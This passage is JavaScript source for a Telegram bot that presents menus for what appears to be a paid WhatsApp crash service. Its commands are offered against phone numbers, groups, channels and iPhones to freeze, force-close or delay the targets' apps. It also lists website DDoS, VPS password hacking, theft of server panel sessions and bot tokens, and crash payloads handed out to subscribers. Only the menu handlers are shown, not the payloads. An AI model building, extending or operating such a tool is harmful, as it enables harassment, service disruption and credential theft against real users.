      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "attackmenu_menu", style: "success", }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("ui_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐔͢𝐢͡ ⍣᳟ 𝐌͢𝐞͡𝐧͜𝐮</strong></blockquote>
⫹⫺ - /overloadsystem ━ Crash Ui System 🥶
└‣ Bug Type Ui Freeze X Overload
⫹⫺ - /uiloca ━ Loca Ui System 🦠
└‣ Bug Type Ui Freeze X Location
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐔͢𝐢͡ ⍣᳟ 𝐋͜𝐞͢𝐯͜𝐞͢𝐥</strong></blockquote>
⫹⫺ - /uieasy ━ Ui Level Easy 💣
└‣ Ui With Difficult Easy
⫹⫺ - /uimedium ━ Ui Level Medium 🐉
└‣ Ui With Difficult Medium
⫹⫺ - /uihard ━ Ui Level Hard 💀
└‣ Ui With Difficult Hard
⫹⫺ - /uihardsuper ━ Ui Level Super Hard ☢️
└‣ Ui With Difficult Super Hard
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "attackmenu_menu" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("jmbud_menu", checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐒͢𝐩͜𝐞͡𝐜͢𝐢͜𝐚͡𝐥 𝐁͢𝐮͡𝐠</strong></blockquote>
⫹⫺ - /attack ━ Select The Button Bug 🔮
└‣ Button Bug
⟣━━━━━━━━━━━━━━━━━━
⫹⫺ - /multibug ━ Multi Bug Core ⚡
└‣ Bug With 2 Number Or More
⟣━━━━━━━━━━━━━━━━━━
⫹⫺ - /xslomotion ━ Free Loop Bug 🩸
└‣ Bug Delay Free Loop And Sleep
⟣━━━━━━━━━━━━━━━━━━
#Note:
𝙏𝙮𝙥𝙚 𝘽𝙪𝙜 𝘿𝙞𝙖𝙩𝙖𝙨 𝙢𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙠𝙖𝙣 𝙗𝙪𝙩𝙩𝙤𝙣 𝙘𝙤𝙣𝙩𝙤𝙝 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 :
/attack 62xx 𝙢𝙖𝙠𝙖 𝙖𝙠𝙖𝙣 𝙢𝙚𝙢𝙪𝙣𝙘𝙪𝙡𝙠𝙖𝙣 𝙗𝙚𝙗𝙚𝙧𝙖𝙥𝙖 𝙢𝙚𝙣𝙪 𝙗𝙪𝙩𝙩𝙤𝙣 𝙗𝙪𝙜, 𝙨𝙚𝙡𝙖𝙢𝙖𝙩 𝙢𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙠𝙖𝙣 
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "attackmenu_menu", style: "primary", }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("bukceha_menu", checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐀͢𝐭͡𝐭͜𝐚͢𝐜͜𝐤 𝐂͢𝐡  ⍣᳟ 𝐌͢𝐞͡𝐧͜𝐮</strong></blockquote>
⫹⫺ - /newsletterfc ━ Force Close Ch 👁️‍🗨️
└‣ Newsletter Force No Click
⟣━━━━━━━━━━━━━━━━━━
#Note:
𝙉𝙤𝙢𝙤𝙧 𝙖𝙩𝙖𝙪 𝙨𝙚𝙣𝙙𝙚𝙧 𝙠𝙖𝙢𝙪, 𝙝𝙖𝙧𝙪𝙨 𝙢𝙚𝙣𝙟𝙖𝙙𝙞 𝙖𝙙𝙢𝙞𝙣 𝙙𝙞 𝙘𝙝𝙖𝙣𝙣𝙚𝙡 𝙩𝙖𝙧𝙜𝙚𝙩 𝙖𝙜𝙖𝙧 𝙗𝙞𝙨𝙖 𝙗𝙪𝙜 𝙙𝙚𝙣𝙜𝙖𝙣 𝙡𝙖𝙣𝙘𝙖𝙧 𝙙𝙖𝙣 𝙩𝙖𝙣𝙥𝙖 𝙠𝙚𝙣𝙙𝙖𝙡𝙖 
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "attackmenu_menu", style: "success", }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("plerr_menu", checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐒͢𝐞͡𝐜͜𝐫͢𝐞͜𝐭. ⍣᳟ 𝐌͢𝐞͡𝐧͜𝐮</strong></blockquote>
⫹⫺ - /unknown1 ━ Secret Bug V1❓
└‣ Undefined Bug ??
⫹⫺ - /unknown2 ━ Secret Bug V2 ⁉️
└‣ Undefined Bug ??
⫹⫺ - /unknown3 ━ Secret Bug V3 ❔
└‣ Undefined Bug ??
⟣━━━━━━━━━━━━━━━━━━
#Note:
𝘿𝙞 𝙘𝙤𝙢𝙢𝙖𝙙 𝙗𝙪𝙜 𝙞𝙣𝙞, 𝙞𝙣𝙞 𝙖𝙙𝙖𝙡𝙖𝙝 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙗𝙪𝙜 𝙧𝙖𝙝𝙖𝙨𝙞𝙖 𝙮𝙖𝙣𝙜 𝙝𝙖𝙧𝙪𝙨 𝙠𝙞𝙩𝙖 𝙘𝙤𝙗𝙖, 𝙨𝙪𝙥𝙖𝙮𝙖 𝙠𝙞𝙩𝙖 𝙗𝙞𝙨𝙖 𝙩𝙖𝙪 𝙗𝙪𝙜 𝙖𝙥𝙖 𝙮𝙖𝙣𝙜 𝙩𝙚𝙧𝙠𝙞𝙧𝙞𝙢
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "attackmenu_menu", style: "primary", }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("comu_menu", checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐀͢𝐭͡𝐭͜𝐚͢𝐜͡𝐤 𝐂͜𝐨͢𝐦͡𝐮  ⍣᳟ 𝐌͢𝐞͡𝐧͜𝐮</strong></blockquote>
⫹⫺ - /uicomu ━ Overload Comu 💣
└‣ Bug Comu Ui Crash
⫹⫺ - /crashclickcomu ━ Crash Click Comu 🐉
└‣ Bug Comu Click Crash
⟣━━━━━━━━━━━━━━━━━━
𝙎𝙀𝙉𝘿𝙀𝙍 𝘼𝙏𝘼𝙐 𝙉𝙊𝙈𝙊𝙍 𝘼𝙉𝘿𝘼 𝙃𝘼𝙍𝙐𝙎 𝙈𝘼𝙉𝙅𝘼𝘿𝙄 𝘼𝘿𝙈𝙄𝙉 𝙆𝙊𝙈𝙐𝙉𝙄𝙏𝘼𝙎 𝙐𝙉𝙏𝙐𝙆 𝘽𝙄𝙎𝘼 𝙈𝙀𝙉𝙅𝘼𝙇𝘼𝙉𝙆𝘼𝙉 𝘽𝙐𝙂 𝙏𝘼𝙉𝙋𝘼 𝙂𝘼𝙉𝙂𝙂𝙐𝘼𝙉
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "attackmenu_menu", style: "danger", }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("bug_menu3", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐀͢𝐭͜𝐭͡𝐚͢𝐜͜𝐤 ͡𝐕3  ⍣᳟ 𝐌͢𝐞͡𝐧͜𝐮</strong></blockquote>
⫹⫺ - /comboblank ━ Combo Blank ☠️
└‣ Blank Type Combo
⫹⫺ - /combodelay ━ Combo Delay 💀
└‣ Delay Type Combo
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "attackmenu_menu", style: "success", }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("thanks_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }
  
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐓͢𝐡͡𝐚͜𝐧͢𝐤͡𝐬  ⍣᳟ 𝐓͜𝐨͢</strong></blockquote>
⫹⫺ - Allah ━ My Goood
⫹⫺ - Nabi Muhammad ━ My Idola
⫹⫺ - Family ━ My Big Support
⫹⫺ - @Raffioffci2 ━ Developer
⫹⫺ - Kayzen ━ My Support
⫹⫺ - Rulzz ━ My Friend's 
⫹⫺ - Razzx ━ My Support 
⫹⫺ - Marz ━ My Support 
⫹⫺ - Vinzx ━ My Support 
⫹⫺ - Pou ━ My Guru
⫹⫺ - Veroo ━ My Guru
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "back", style: "danger", }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("other_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }   

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong> 𝐢͢𝐎͜𝐬͡ ⍣᳟𝐌͢𝐞͡𝐧͜𝐮 </strong></blockquote>
⫹⫺ - /xipongforce ━ Force iOs 🍏
└‣ Bug iOs Force
⫹⫺ - /xipongdelay ━ Delay iOs 🍎
└‣ Bug iOs Delay
⫹⫺ - /xipongui ━ Ui iOs 🖥️
└‣ Bug iOs Ui
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "attackmenu_menu", style: "primary", }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("grup_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐀͢𝐭͡𝐭͜𝐚͢𝐜͡𝐤 ͜⍣᳟ 𝐆͢𝐛͡ ⍣᳟ 𝐌͜𝐞͢𝐧͡𝐮</strong></blockquote>
⫹⫺ - /crashclickgroup ━ Force Click Grup ☣️
└‣ Bug Group Crash Click Type Loca
⫹⫺ - /blankclickgroup ━ Blank Click Grup 💣
└‣ Bug Group Blank Click All Member
⫹⫺ - /uigroup ━ Overload Grup 🦠
└‣ Bug Group Crash Ui
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "attackmenu_menu", style: "success", }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("donlot_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐃͢𝐨͡𝐰͜𝐧͢𝐥͜𝐨͢𝐚͡𝐝 ⍣᳟ 𝐌͜𝐞͢𝐧͡𝐮</strong></blockquote>
⫹⫺ - /tiktokdl ━ Tiktok Download 🎭
⫹⫺ - /ig ━ Instagram Downloader 📥
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "group_menu", style: "primary", }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("deploi_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐃͢𝐞͡𝐩͜𝐥͢𝐨͡𝐲 ⍣᳟ 𝐌͜𝐞͢𝐧͡𝐮</strong></blockquote>
⫹⫺ - /deploy [token] ━ Deploy New Bot 🚀
⫹⫺ - /listdeploy ━ View Active Bots 📑
⫹⫺ - /deldeploy [token] ━ Remove One Bot ❌
⫹⫺ - /stopall ━ Stop All Bots ♻️
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "group_menu", style: "danger", }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("fun_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }
  
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐅͢𝐮͡𝐧͜͡ ⍣᳟ 𝐌͜𝐞͢𝐧͡𝐮</strong></blockquote>
⫹⫺ - /bucin ━ Quest Bucin 🥴
⫹⫺ - /sadboy ━ Quest Sad 😌
⫹⫺ - /gaymeter ━ Tes Gay Meter 💀
⫹⫺ - /ghost ━ The Ghost Is Here 👻
⫹⫺ - /hack ━ User Hacking 🖥️
⫹⫺ - /bomtag ━ Bom Fun 💣
⫹⫺ - /tebakangka ━ Tebak Angka 🎯
⫹⫺ - /toxic ━ Level Toxic ☣️
⫹⫺ - /tinju ━ Tinju User 🥊
⫹⫺ - /sultan ━ Aura Sultan 👑
⫹⫺ - /duel ━ Challenge a User ⚔️
⫹⫺ - /iq ━ Cek IQ 🧠
⫹⫺ - /waifu ━ Cek Waifu 😋
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "group_menu" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("tools_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐓͢𝐨͡𝐨͜͡𝐥͢𝐬͡ ⍣᳟ 𝐌͜𝐞͢𝐧͡𝐮</strong></blockquote>
⫹⫺ - /gpt ━ Chat With Ai Gpt 🤖
⫹⫺ - /ddosweb ━ Dodos Website ☠️
⫹⫺ - /hackvps ━ Hack Data Pw & Ip Vps ☠️
⫹⫺ - /countryinfo ━ Information The Country 🇳🇱
⫹⫺ - /tourl ━ From Image/Video To Url 🤧
⫹⫺ - /ssiphone ━ Ss Whatsapp Iphone 📱
⫹⫺ - /brat ━ Create Sticker Brat 🔮
⫹⫺ - /getcode ━ Get HTML Code ⚜️
⫹⫺ - /cekwa ━ Cek Status Wa 👁️‍🗨️
⫹⫺ - /cektele ━ Cek Status Telegram 👁️
⫹⫺ - /tofunc ━ All Media To Func 📝
⫹⫺ - /getfuncblank ━ Get Function Blank 😎
⫹⫺ - /getfuncdelay ━ Get Function Delay 🤓
⫹⫺ - /getfuncfc ━ Get Function Force Close 🦠
⫹⫺ - /web2apk ━ Web To Apps 📡
⫹⫺ - /trackip ━ Tracking Ip ☠️
⫹⫺ - /maps ━ Maps & Location 🗺️
⫹⫺ - /speed ━ Bot Response Speed ⚡
⫹⫺ - /cuaca ━ City Weather Information 🌦️
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "group_menu" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("md_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }
  
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐆͢𝐫͡𝐨͜𝐮͢𝐩 ⍣᳟ 𝐌͜𝐞͢𝐧͡𝐮</strong></blockquote>
⫹⫺ - /promote (reply) ━ Promote To Admin ⬆️
⫹⫺ - /demote (reply) ━ Demote Admin ⬇️
⫹⫺ - /kick (reply) ━ Remove Member 👢
⫹⫺ - /mute (reply) ━ Silence Member 🔇
⫹⫺ - /unmute (reply) ━ Unsilence Member 🔊
⫹⫺ - /pin (reply) ━ Pin Selected Message 📌
⫹⫺ - /del (reply) ━ Delete Replied Message 🗑️
⫹⫺ - /lock ━ Lock Group (Close Gb Chat) 🔒
⫹⫺ - /unlock ━ Unlock Group (Open Gb Chat) 🔓
⫹⫺ - /info ━ Account Information 🆔
⫹⫺ - /antilink on/off ━ Group Anti-Link 🚫
⫹⫺ - /setrules ━ Set Group Rules 📜
⫹⫺ - /rules ━ View Group Rules 📖
⫹⫺ - /tagadmin ━ Tag All Group Admins 👑
⫹⫺ - /groupinfo ━ Group Information ℹ️
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "group_menu" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("nsfw_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐍͢𝐬͡𝐟͜𝐰͢ ⍣᳟ 𝐌͜𝐞͢𝐧͡𝐮</strong></blockquote>
⫹⫺ - /xnxx ━ Video XnXx 🔞
⫹⫺ - /hentai ━ Hentai Nsfw 💀
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "group_menu" }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("owner_menu", checkOwner, async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>🗿 𝐀͢𝐝͡𝐦͜𝐢͢𝐧 𝐀͡𝐜͜𝐜͢𝐞͡𝐬͜𝐬 🗿</strong></blockquote>
⫹⫺ - /addprem ━ Addpremium ⚡
⫹⫺ - /delprem ━ Delpremium 😤
⫹⫺ - /cekprem ━ Cek Premium 🥶
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>🎩 𝐎͢𝐰͡𝐧͜𝐞͢𝐫 𝐀͡𝐜͜𝐜͢𝐞͡𝐬͜𝐬 🎩</strong></blockquote>
⫹⫺ - /rasukbot ━ Get An Expert Bot Token 👁️‍🗨️
⫹⫺ - /csessions ━ Steal Session Panel Srv 😋
⫹⫺ - /addadmin ━ Add Admin Access 🎩
⫹⫺ - /deladmin ━ Del Admin Access 🔥
⫹⫺ - /status ━ Status Bot 🥶
⫹⫺ - /addsender ━ Add Bot 🤭
⟣━━━━━━━━━━━━━━━━━━
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ ", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("back", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const userId = ctx.from.id.toString();
